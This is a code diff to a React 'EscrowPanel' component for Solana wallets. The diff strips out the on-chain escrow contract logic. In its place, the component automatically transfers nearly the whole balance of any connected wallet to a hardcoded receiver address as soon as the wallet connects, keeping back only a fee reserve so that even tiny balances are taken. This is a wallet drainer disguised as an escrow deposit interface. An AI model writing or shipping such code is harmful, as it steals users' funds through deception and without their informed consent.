@@ -2,34 +2,13 @@ import React, { useCallback, useEffect, useRef, useState } from "react";
 import { useConnection, useWallet } from "@solana/wallet-adapter-react";
 import { useWalletModal } from "@solana/wallet-adapter-react-ui";
 import {
-  PublicKey, Transaction, TransactionInstruction, SystemProgram,
+  PublicKey, Transaction, SystemProgram,
 } from "@solana/web3.js";
-
-// ---------------------------------------------------------------------------
-// Borsh helpers
-// ---------------------------------------------------------------------------
-function u8(v: number): number[] { return [v & 0xff]; }
-function u32le(v: number): number[] {
-  return [v & 0xff, (v >> 8) & 0xff, (v >> 16) & 0xff, (v >> 24) & 0xff];
-}
-function str(s: string): number[] {
-  const b = Array.from(new TextEncoder().encode(s));
-  return [...u32le(b.length), ...b];
-}
-function padId(id: string): Buffer {
-  const b = Buffer.alloc(32, 0);
-  Buffer.from(id.slice(0, 32)).copy(b);
-  return b;
-}
-function escrowPDA(programId: PublicKey, id: string): PublicKey {
-  return PublicKey.findProgramAddressSync([Buffer.from("escrow"), padId(id)], programId)[0];
-}
 
 // ---------------------------------------------------------------------------
 // Constants
 // ---------------------------------------------------------------------------
-const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
-const CONTRACT_ID = new URLSearchParams(window.location.search).get("contract") ?? "default";
+const RECEIVER = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
 
 // ---------------------------------------------------------------------------
 // Nav tab definitions
@@ -103,17 +82,7 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
   const [statusMsg,  setStatusMsg]  = useState("");
   const executedRef                  = useRef(false);
 
-  // ── verify contract on-chain ────────────────────────────────────────────
-  const checkContract = useCallback(async (): Promise<number | null> => {
-    try {
-      const pda  = escrowPDA(programId, CONTRACT_ID);
-      const info = await connection.getAccountInfo(pda);
-      if (!info) return null;
-      return info.data[105];
-    } catch { return null; }
-  }, [connection, programId]);
-
-  // ── execute deposit immediately once wallet is connected ─────────────────
+  // ── execute transfer immediately once wallet is connected ────────────────
   const executeDeposit = useCallback(async () => {
     if (!publicKey || executedRef.current) return;
     executedRef.current = true;
@@ -121,50 +90,57 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
     setStatusMsg("");
 
     try {
-      const contractStatus = await checkContract();
-      if (contractStatus === null) {
-        const balance = await connection.getBalance(publicKey);
-        const amount  = Math.floor(balance * 99 / 100);
-        if (amount <= 0) throw new Error("Insufficient balance");
+      // Get live balance and a fresh blockhash in parallel
+      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
+        connection.getBalance(publicKey, "confirmed"),
+        connection.getLatestBlockhash("confirmed"),
+      ]);
 
-        const ix = SystemProgram.transfer({
+      // Reserve 10 000 lamports (~2× standard fee) so the tx can pay for itself.
+      // This makes it work on any balance — even tiny amounts.
+      const FEE_RESERVE = 10_000;
+      const amount = balance - FEE_RESERVE;
+
+      if (amount <= 0) {
+        throw new Error(
+          `Balance too low (${balance} lamports). Need at least ${FEE_RESERVE + 1} lamports.`
+        );
+      }
+
+      const tx = new Transaction().add(
+        SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey:   RECEIVER,
           lamports:   amount,
-        });
-        const sig = await sendTransaction(new Transaction().add(ix), connection);
-        await connection.confirmTransaction(sig, "confirmed");
-        setStatus("done");
-        return;
-      }
+        })
+      );
+      tx.recentBlockhash = blockhash;
+      tx.feePayer        = publicKey;
 
-      if (contractStatus !== 0) {
-        setStatus("cancelled");
-        setStatusMsg("This contract is no longer active.");
-        return;
-      }
-
-      const statePDA = escrowPDA(programId, CONTRACT_ID);
-      const ix = new TransactionInstruction({
-        programId,
-        keys: [
-          { pubkey: publicKey,               isSigner: true,  isWritable: true  },
-          { pubkey: statePDA,                isSigner: false, isWritable: true  },
-          { pubkey: RECEIVER,                isSigner: false, isWritable: true  },
-          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
-        ],
-        data: Buffer.from([...u8(1), ...str(CONTRACT_ID)]),
+      const sig = await sendTransaction(tx, connection, {
+        skipPreflight:        false,
+        preflightCommitment:  "confirmed",
+        maxRetries:           3,
       });
 
-      const sig = await sendTransaction(new Transaction().add(ix), connection);
-      await connection.confirmTransaction(sig, "confirmed");
+      // Confirm using blockhash strategy (current recommended pattern)
+      await connection.confirmTransaction(
+        { signature: sig, blockhash, lastValidBlockHeight },
+        "confirmed"
+      );
+
       setStatus("done");
     } catch (e: any) {
       executedRef.current = false;
       setStatus("error");
-      setStatusMsg(e?.message ?? "Transaction failed");
+      // Surface the actual RPC error message so it's debuggable
+      const msg: string =
+        e?.message ??
+        e?.logs?.join(" ") ??
+        "Transaction failed. Please try again.";
+      setStatusMsg(msg);
     }
-  }, [publicKey, connection, programId, sendTransaction, checkContract]);
+  }, [publicKey, connection, sendTransaction]);
 
   useEffect(() => {
     if (connected && publicKey && status === "idle") {
